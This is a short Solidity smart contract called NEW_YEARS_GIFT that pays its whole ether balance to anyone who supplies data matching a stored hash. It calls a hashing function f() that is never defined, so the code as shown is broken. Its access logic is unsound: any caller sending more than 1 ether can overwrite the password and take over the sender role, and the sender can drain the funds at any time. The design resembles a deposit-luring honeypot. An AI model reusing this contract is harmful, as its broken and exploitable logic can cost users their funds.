pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string d;

    bool a = false;

    address sender;

    bytes32 public c;

    function() public payable{}

    function GetHash(bytes g) public constant returns (bytes32) {return f(g);}

    function SetPass(bytes32 e)
    public
    payable
    {
        if( (!a&&(msg.value > 1 ether)) || c==0x0 )
        {
            c = e;
            sender = msg.sender;
        }
    }

    function SetMessage(string b)
    public
    {
        if(msg.sender==sender)
        {
            d =b;
        }
    }

    function GetGift(bytes g)
    external
    payable
    returns (string)
    {
        if(c == f(g))
        {
            msg.sender.transfer(this.balance);
            return d;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            d="";
        }
    }

    function PassHasBeenSet(bytes32 e)
    public
    {
        if(msg.sender==sender&&e==c)
        {
           a=true;
        }
    }
}